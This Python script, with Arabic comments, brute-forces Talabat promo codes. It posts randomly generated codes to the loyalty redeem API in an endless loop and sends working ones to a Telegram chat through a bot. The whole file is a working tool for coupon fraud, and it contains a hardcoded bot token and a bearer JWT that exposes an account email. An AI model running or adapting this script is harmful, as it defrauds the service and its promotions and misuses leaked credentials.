import requests
import json
import random
import string
import telebot
####bot spam ###
tok = "7620190655:AAHjHgkGbCBLox7y_7pwxD6Y4tnPCgWptMI"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
def generate_random_code():
    # تثبيت الجزء "L7G"
    fixed_part = "P8K"
    
    # توليد 5 أحرف وأرقام عشوائية
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
    
    # دمج الجزء الثابت مع الجزء العشوائي
    return fixed_part + random_part
def t():
    code=generate_random_code()
    url = "https://loyalty.talabat.com/api/v3/me/promo-codes/redeem"
    
    payload = json.dumps({
      "promoCode":code,
      "country": 9
    })
    print(code)
    
    headers = {
      'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
      'Accept-Encoding': "gzip",
      'Content-Type': "application/json",
     # 'x-perseussessionid': "1721863131871.485423224486340084.tPVVBwiBvD",
      #'x-device-version': "11.210",
     # 'x-device-source': "",
      #'x-perseusclientid': "1721863131857.493687602552868028.AdQcj2fDun",
      'authorization': "bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleW1ha2VyLXRhbGFiYXQtMDAyNi1hbmRyb2lkIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwczovL3RhbGFiYXQuZGgtYXV0aC5pbyIsInN1YiI6IjQyODc0MTg3IiwiYXVkIjoiYW5kcm9pZCIsImV4cCI6MTczOTMwMTM5MiwiaWF0IjoxNzM5MjU4MTkyLCJqdGkiOiJjdHRydGk1bjBiNWxrbGRwbjVhejNwMWxnbjFldWRybzZkOWhjcjR2Iiwic2NvcGUiOiIiLCJtZXRhZGF0YSI6eyJlbWFpbCI6InRhcmVra2FyaXptYTFAZ21haWwuY29tIn19.x9MuksBQYaJazivIO5pylN9CPQ7I1uXenwKAj1ZirhSbW2-3vVqUZE9_YOSFQVrVNCxPOP2-qqpOZGjd5Qnv9kYsCvTK_mCfWMjDZVo-zd0NL32qd2-DV9-NdhaB5highx_kvMxnV1BnorNcp_mYoOhUUtrmeMZSnmA4sWS2xJrI2Y9cs9Q1rCWO62PmEFlVUZSoQQadpdd0ombP4xPLoUjCoDlkYZToZsK7_VoVfg0GFhEhbSLl71m0cUtBGtZsba4FRyzjgF09rkrIW8Nnh5x1yJdvRqTARhOheSrwMyGvmhksBD-GqoQKmSKbWyoC2PAGTjbvXA2KK9nacHn9Qw",
      'tokentypekey': "jwt",
      #'appbrand': "1",
      'accept-language': "ar-KW",
      #'x-device-id': "cd2a415e513668a1",
     # 'x-device-framework': "flutter"
    }
    
    response = requests.post(url, data=payload, headers=headers).text
    #print(response)
    if "كود القسيمة هذا غير صحيح،" in response:
        print("BAD")
    elif "هذه الحملة قد وصلت إلى حدها الأقصى"in response:
        print("suspect") 
        botA.send_message(chat_id=ch_id, text=code)
        botA.send_message(chat_id=ch_id, text="suspect")
    elif "الشروط" in response:
         botA.send_message(chat_id=ch_id, text=code)
         botA.send_message(chat_id=ch_id, text="شغاال") 
    elif "ساري" in response:
         botA.send_message(chat_id=ch_id, text=code)
         botA.send_message(chat_id=ch_id, text="شغاال") 
    elif response == "":pass
    elif "has banned you temporarily from accessing" in response:
        print("IP Ban ")
    else:
        print(response)
        botA.send_message(chat_id=ch_id, text=code)       
while True:
    try:
        t()
        os.system('cls' if os.name == 'nt' else 'clear')
    except:pass
